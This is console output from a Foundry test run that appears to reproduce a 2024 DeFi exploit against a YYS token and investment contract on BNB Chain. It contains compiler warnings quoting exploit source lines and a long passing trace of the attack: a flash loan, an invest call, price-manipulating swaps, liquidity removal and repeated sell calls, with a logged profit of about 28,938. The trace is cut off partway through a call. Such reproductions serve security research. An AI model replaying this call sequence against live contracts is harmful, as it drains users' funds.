Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.35s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (9302): Return value of low-level calls not used.
  --> src/test/2024-06/YYS_exp.sol:42:7:
   |
42 |       address(invest).call(abi.encodeWithSelector(bytes4(0xb9b8c246), address(Anotheraddress),100 ether));
   |       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Warning (2072): Unused local variable.
  --> src/test/2024-06/YYS_exp.sol:75:9:
   |
75 |         uint256 bal=YYStoken.balanceOf(address(this));
   |         ^^^^^^^^^^^


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 290.10ms (227.83µs CPU time)

Ran 1 test for src/test/2024-06/YYS_exp.sol:ContractTest
[PASS] testExploit() (gas: 1600443)
Logs:
  After Profit: : 28937.959823595053725574

Traces:
  [1906743] ContractTest::testExploit()
    ├─ [24562] 0x55d398326f99059fF775485246999027B3197955::approve(0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [745137] 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9::invest(0xC772718b5206EF788D33F43A2a80a104a1867BD4, 100000000000000000000 [1e20])
    │   ├─ emit Register(: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 0xC772718b5206EF788D33F43A2a80a104a1867BD4)
    │   ├─ [15634] 0x55d398326f99059fF775485246999027B3197955::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, 100000000000000000000 [1e20])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, value: 100000000000000000000 [1e20])
    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, value: 115792089237316195423570985008687907853269984665640564039357584007913129639935 [1.157e77])
    │   │   └─ ← [Return] true
    │   ├─ [8071] 0x55d398326f99059fF775485246999027B3197955::transfer(0xb38188f3e37369d5319070BD0F39Cb44084D8548, 5000000000000000000 [5e18])
    │   │   ├─ emit Transfer(from: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, to: 0xb38188f3e37369d5319070BD0F39Cb44084D8548, value: 5000000000000000000 [5e18])
    │   │   └─ ← [Return] true
    │   ├─ [25171] 0x55d398326f99059fF775485246999027B3197955::transfer(0x3064c2bC2520c95416DBA845B24F61185cA10622, 3000000000000000000 [3e18])
    │   │   ├─ emit Transfer(from: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, to: 0x3064c2bC2520c95416DBA845B24F61185cA10622, value: 3000000000000000000 [3e18])
    │   │   └─ ← [Return] true
    │   ├─ [2607] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::balanceOf(0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F) [staticcall]
    │   │   └─ ← [Return] 4311474855490482343535584 [4.311e24]
    │   ├─ [120173] 0x8228A4aD192d5D82189afd6e194f65edb8c76a41::swapExactTokensForTokens(45000000000000000000 [4.5e19], 0, [0x55d398326f99059fF775485246999027B3197955, 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510], 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, 1717861306 [1.717e9])
    │   │   ├─ [2893] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::getReserves() [staticcall]
    │   │   │   └─ ← [Return] 97686688559980912216610 [9.768e22], 4311474855490482343535584 [4.311e24], 1717859739 [1.717e9]
    │   │   ├─ [15634] 0x55d398326f99059fF775485246999027B3197955::transferFrom(0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, 45000000000000000000 [4.5e19])
    │   │   │   ├─ emit Transfer(from: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, to: 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, value: 45000000000000000000 [4.5e19])
    │   │   │   ├─ emit Approval(owner: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, spender: 0x8228A4aD192d5D82189afd6e194f65edb8c76a41, value: 115792089237316195423570985008687907853269984665640564001702584007913129639935 [1.157e77])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [88563] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::swap(0, 1980233363442873597519 [1.98e21], 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, 0x)
    │   │   │   ├─ [54113] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transfer(0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, 1980233363442873597519 [1.98e21])
    │   │   │   │   ├─ [40075] 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9::userRewardInfo(0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000056bc75e2d6310000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ emit Transfer(from: 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, to: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, value: 1980233363442873597519 [1.98e21])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F) [staticcall]
    │   │   │   │   └─ ← [Return] 97731688559980912216610 [9.773e22]
    │   │   │   ├─ [607] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::balanceOf(0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F) [staticcall]
    │   │   │   │   └─ ← [Return] 4309494622127039469938065 [4.309e24]
    │   │   │   ├─ emit Sync(reserve0: 97731688559980912216610 [9.773e22], reserve1: 4309494622127039469938065 [4.309e24])
    │   │   │   ├─ emit Swap(sender: 0x8228A4aD192d5D82189afd6e194f65edb8c76a41, amount0In: 45000000000000000000 [4.5e19], amount1In: 0, amount0Out: 0, amount1Out: 1980233363442873597519 [1.98e21], to: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9)
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] [45000000000000000000 [4.5e19], 1980233363442873597519 [1.98e21]]
    │   ├─ [893] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::getReserves() [staticcall]
    │   │   └─ ← [Return] 97731688559980912216610 [9.773e22], 4309494622127039469938065 [4.309e24], 1717861306 [1.717e9]
    │   ├─ [57411] 0x8228A4aD192d5D82189afd6e194f65edb8c76a41::addLiquidity(0x55d398326f99059fF775485246999027B3197955, 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510, 45000000000000000000 [4.5e19], 1984282281961164671578 [1.984e21], 0, 0, 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, 1717861306 [1.717e9])
    │   │   ├─ [2676] 0xB018B22b54AD66B4D369082d394076DaC327ACbA::getPair(0x55d398326f99059fF775485246999027B3197955, 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510) [staticcall]
    │   │   │   └─ ← [Return] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F
    │   │   ├─ [893] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::getReserves() [staticcall]
    │   │   │   └─ ← [Return] 97731688559980912216610 [9.773e22], 4309494622127039469938065 [4.309e24], 1717861306 [1.717e9]
    │   │   ├─ [6034] 0x55d398326f99059fF775485246999027B3197955::transferFrom(0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, 45000000000000000000 [4.5e19])
    │   │   │   ├─ emit Transfer(from: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, to: 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, value: 45000000000000000000 [4.5e19])
    │   │   │   ├─ emit Approval(owner: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, spender: 0x8228A4aD192d5D82189afd6e194f65edb8c76a41, value: 115792089237316195423570985008687907853269984665640564001657584007913129639935 [1.157e77])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [7015] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transferFrom(0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, 1984282281961164671578 [1.984e21])
    │   │   │   ├─ [472] 0x8228A4aD192d5D82189afd6e194f65edb8c76a41::d000b517(000000000000000000000000cc0f0f41f4c4c17493517dd6c6d9dd1adb134fc9) [staticcall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   ├─ emit Transfer(from: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, to: 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, value: 1984282281961164671578 [1.984e21])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [31420] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::mint(0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9)
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F) [staticcall]
    │   │   │   │   └─ ← [Return] 97776688559980912216610 [9.777e22]
    │   │   │   ├─ [607] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::balanceOf(0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F) [staticcall]
    │   │   │   │   └─ ← [Return] 4311478904409000634609643 [4.311e24]
    │   │   │   ├─ [2354] 0xB018B22b54AD66B4D369082d394076DaC327ACbA::feeTo() [staticcall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, value: 298717126235710500126 [2.987e20])
    │   │   │   ├─ emit Sync(reserve0: 97776688559980912216610 [9.777e22], reserve1: 4311478904409000634609643 [4.311e24])
    │   │   │   ├─ emit Mint(sender: 0x8228A4aD192d5D82189afd6e194f65edb8c76a41, amount0: 45000000000000000000 [4.5e19], amount1: 1984282281961164671578 [1.984e21])
    │   │   │   └─ ← [Return] 298717126235710500126 [2.987e20]
    │   │   └─ ← [Return] 45000000000000000000 [4.5e19], 1984282281961164671578 [1.984e21], 298717126235710500126 [2.987e20]
    │   ├─ emit Invest(: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 100000000000000000000 [1e20])
    │   └─ ← [Stop] 
    ├─ [1115608] 0x92b7807bF19b7DDdf89b706143896d05228f3121::flash(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4750000000000000000000000 [4.75e24], 0, 0x0000000000000000000000000000000000000000000000000000000000000001)
    │   ├─ [2531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x92b7807bF19b7DDdf89b706143896d05228f3121) [staticcall]
    │   │   └─ ← [Return] 16096920824501522838601458 [1.609e25]
    │   ├─ [9796] 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d::balanceOf(0x92b7807bF19b7DDdf89b706143896d05228f3121) [staticcall]
    │   │   ├─ [2553] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::balanceOf(0x92b7807bF19b7DDdf89b706143896d05228f3121) [delegatecall]
    │   │   │   └─ ← [Return] 7099202292482238571175528 [7.099e24]
    │   │   └─ ← [Return] 7099202292482238571175528 [7.099e24]
    │   ├─ [6071] 0x55d398326f99059fF775485246999027B3197955::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4750000000000000000000000 [4.75e24])
    │   │   ├─ emit Transfer(from: 0x92b7807bF19b7DDdf89b706143896d05228f3121, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 4750000000000000000000000 [4.75e24])
    │   │   └─ ← [Return] true
    │   ├─ [1065614] ContractTest::pancakeV3FlashCallback(475000000000000000000 [4.75e20], 0, 0x0000000000000000000000000000000000000000000000000000000000000001)
    │   │   ├─ [9050] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::sync()
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F) [staticcall]
    │   │   │   │   └─ ← [Return] 97776688559980912216610 [9.777e22]
    │   │   │   ├─ [607] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::balanceOf(0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F) [staticcall]
    │   │   │   │   └─ ← [Return] 4311478904409000634609643 [4.311e24]
    │   │   │   ├─ emit Sync(reserve0: 97776688559980912216610 [9.777e22], reserve1: 4311478904409000634609643 [4.311e24])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [24562] 0x55d398326f99059fF775485246999027B3197955::approve(0x8228A4aD192d5D82189afd6e194f65edb8c76a41, 4750000000000000000000000 [4.75e24])
    │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x8228A4aD192d5D82189afd6e194f65edb8c76a41, value: 4750000000000000000000000 [4.75e24])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [5111] 0x8228A4aD192d5D82189afd6e194f65edb8c76a41::getAmountsOut(4749900000000000000000000 [4.749e24], [0x55d398326f99059fF775485246999027B3197955, 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510]) [staticcall]
    │   │   │   ├─ [893] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::getReserves() [staticcall]
    │   │   │   │   └─ ← [Return] 97776688559980912216610 [9.777e22], 4311478904409000634609643 [4.311e24], 1717861306 [1.717e9]
    │   │   │   └─ ← [Return] [4749900000000000000000000 [4.749e24], 4224303677750553047381606 [4.224e24]]
    │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, 4749900000000000000000000 [4.749e24])
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, value: 4749900000000000000000000 [4.749e24])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [65579] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::swap(0, 4224303677750553047381606 [4.224e24], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   │   ├─ [50413] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4224303677750553047381606 [4.224e24])
    │   │   │   │   ├─ [24075] 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9::userRewardInfo(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000056bc75e2d631000000000000000000000000000000000000000000000000000056bc75e2d6310000000000000000000000000000000000000000000000000001043561a88293000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ emit Transfer(from: 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 4224303677750553047381606 [4.224e24])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F) [staticcall]
    │   │   │   │   └─ ← [Return] 4847676688559980912216610 [4.847e24]
    │   │   │   ├─ [607] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::balanceOf(0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F) [staticcall]
    │   │   │   │   └─ ← [Return] 87175226658447587228037 [8.717e22]
    │   │   │   ├─ emit Sync(reserve0: 4847676688559980912216610 [4.847e24], reserve1: 87175226658447587228037 [8.717e22])
    │   │   │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 4749900000000000000000000 [4.749e24], amount1In: 0, amount0Out: 0, amount1Out: 4224303677750553047381606 [4.224e24], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [24574] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::approve(0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [607] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 4224303677750553047381606 [4.224e24]
    │   │   ├─ [607] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 4224303677750553047381606 [4.224e24]
    │   │   ├─ [107346] 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9::sell(38584000000000000000000 [3.858e22])
    │   │   │   ├─ [4134] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, 38584000000000000000000 [3.858e22])
    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, value: 38584000000000000000000 [3.858e22])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [8474] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transfer(0xb38188f3e37369d5319070BD0F39Cb44084D8548, 1929200000000000000000 [1.929e21])
    │   │   │   │   ├─ emit Transfer(from: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, to: 0xb38188f3e37369d5319070BD0F39Cb44084D8548, value: 1929200000000000000000 [1.929e21])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [893] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::getReserves() [staticcall]
    │   │   │   │   └─ ← [Return] 4847676688559980912216610 [4.847e24], 87175226658447587228037 [8.717e22], 1717861306 [1.717e9]
    │   │   │   ├─ [439] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::totalSupply() [staticcall]
    │   │   │   │   └─ ← [Return] 649057142655145974964371 [6.49e23]
    │   │   │   ├─ [537] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::balanceOf(0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9) [staticcall]
    │   │   │   │   └─ ← [Return] 137767741348632645921126 [1.377e23]
    │   │   │   ├─ [65092] 0x8228A4aD192d5D82189afd6e194f65edb8c76a41::removeLiquidity(0x55d398326f99059fF775485246999027B3197955, 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510, 136455393719876305023374 [1.364e23], 0, 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1717861306 [1.717e9])
    │   │   │   │   ├─ [27476] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::transferFrom(0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, 136455393719876305023374 [1.364e23])
    │   │   │   │   │   ├─ emit Transfer(from: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, to: 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, value: 136455393719876305023374 [1.364e23])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [35087] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::burn(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 4847676688559980912216610 [4.847e24]
    │   │   │   │   │   ├─ [607] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::balanceOf(0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 87175226658447587228037 [8.717e22]
    │   │   │   │   │   ├─ [354] 0xB018B22b54AD66B4D369082d394076DaC327ACbA::feeTo() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   │   │   │   ├─ emit Transfer(from: 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, to: 0x0000000000000000000000000000000000000000, value: 136455393719876305023374 [1.364e23])
    │   │   │   │   │   ├─ [6071] 0x55d398326f99059fF775485246999027B3197955::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1019157771622550407164842 [1.019e24])
    │   │   │   │   │   │   ├─ emit Transfer(from: 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1019157771622550407164842 [1.019e24])
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [8513] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 18327399999999999999999 [1.832e22])
    │   │   │   │   │   │   ├─ [4075] 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9::userRewardInfo(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000056bc75e2d631000000000000000000000000000000000000000000000000000056bc75e2d6310000000000000000000000000000000000000000000000000001043561a88293000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   │   ├─ emit Transfer(from: 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 18327399999999999999999 [1.832e22])
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 3828518916937430505051768 [3.828e24]
    │   │   │   │   │   ├─ [607] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::balanceOf(0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 68847826658447587228038 [6.884e22]
    │   │   │   │   │   ├─ emit Sync(reserve0: 3828518916937430505051768 [3.828e24], reserve1: 68847826658447587228038 [6.884e22])
    │   │   │   │   │   ├─ emit Burn(sender: 0x8228A4aD192d5D82189afd6e194f65edb8c76a41, amount0: 1019157771622550407164842 [1.019e24], amount1: 18327399999999999999999 [1.832e22], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   │   │   └─ ← [Return] 1019157771622550407164842 [1.019e24], 18327399999999999999999 [1.832e22]
    │   │   │   │   └─ ← [Return] 1019157771622550407164842 [1.019e24], 18327399999999999999999 [1.832e22]
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [607] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 4204047077750553047381605 [4.204e24]
    │   │   ├─ [607] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 4204047077750553047381605 [4.204e24]
    │   │   ├─ [73957] 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9::sell(4204047077750553047381605 [4.204e24])
    │   │   │   ├─ [4134] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, 4204047077750553047381605 [4.204e24])
    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, value: 4204047077750553047381605 [4.204e24])
    │   │   │   │   └─ ← [Return] true
